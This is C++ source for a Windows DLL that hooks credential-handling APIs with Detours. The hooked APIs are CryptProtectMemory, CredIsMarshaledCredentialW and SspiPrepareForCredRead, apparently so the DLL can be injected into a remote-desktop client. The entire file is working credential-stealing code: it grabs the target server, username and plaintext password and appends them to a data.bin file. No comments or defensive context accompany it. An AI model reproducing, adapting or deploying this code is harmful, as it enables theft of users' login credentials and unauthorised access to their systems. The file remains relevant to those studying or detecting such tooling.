#include "stdafx.h"
#include <Windows.h>
#include <detours.h>
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#define SECURITY_WIN32
#include <sspi.h>
#include <stdio.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")

LPCWSTR lpTempPassword = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpServer = NULL;

VOID WriteCredentials() {
    const DWORD cbBuffer = 1024;
    TCHAR Path[MAX_PATH];

    GetCurrentDirectory(MAX_PATH, Path);

    StringCbCat(Path, MAX_PATH, L"\\data.bin");

    printf("Creating file at path: %ws\n", Path);
    HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create file. Error: %lu\n", GetLastError());
        return;
    }

    WCHAR DataBuffer[cbBuffer];
    memset(DataBuffer, 0x00, cbBuffer);
    DWORD dwBytesWritten = 0;

    printf("Writing data to file...\n");
    StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n", lpServer, lpUsername, lpTempPassword);

    WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &dwBytesWritten, NULL);
    CloseHandle(hFile);

    printf("Data written successfully to file.\n");
}

static SECURITY_STATUS(WINAPI * OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) = SspiPrepareForCredRead;

SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) {
    printf("Preparing for credential read...\n");
    lpServer = pszTargetName;
    return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}

static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;

BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
    printf("Protecting memory...\n");
    DWORD cbPass = 0;
    LPVOID lpPassword;
    int *ptr = (int *)pDataIn;
    LPVOID lpPasswordAddress = ptr + 0x1;
    memcpy_s(&cbPass, 4, pDataIn, 4);

    if (cbPass > 0x2) {
        SIZE_T written = 0;
        lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
        lpTempPassword = (LPCWSTR)lpPassword;
    }

    return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

static BOOL(WINAPI * OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;

BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {
    printf("Checking marshaled credential...\n");
    lpUsername = MarshaledCredential;
    if (wcslen(lpUsername) > 0) {
        WriteCredentials();
    }
    return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved) {
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    if (dwReason == DLL_PROCESS_ATTACH) {
        printf("Attaching detours...\n");
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
        DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
        DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
        DetourTransactionCommit();
    } else if (dwReason == DLL_PROCESS_DETACH) {
        printf("Detaching detours...\n");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
        DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
        DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
        DetourTransactionCommit();
    }
    return TRUE;
}
